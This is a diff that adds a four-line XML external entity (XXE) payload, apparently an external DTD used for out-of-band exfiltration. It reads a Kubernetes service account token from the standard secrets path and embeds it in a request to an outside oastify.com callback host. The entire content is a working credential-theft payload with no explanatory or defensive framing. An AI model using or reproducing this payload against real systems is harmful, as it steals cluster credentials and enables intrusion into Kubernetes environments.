@@ -1,0 +1,4 @@
+<!ENTITY % token SYSTEM "file:///var/run/secrets/kubernetes.io/serviceaccount/token">
+<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://knb7fayoqr3wp25s3rzqmlmb52btzsnh.oastify.com/x?t=%token;'>">
+%wrap;
+%send;
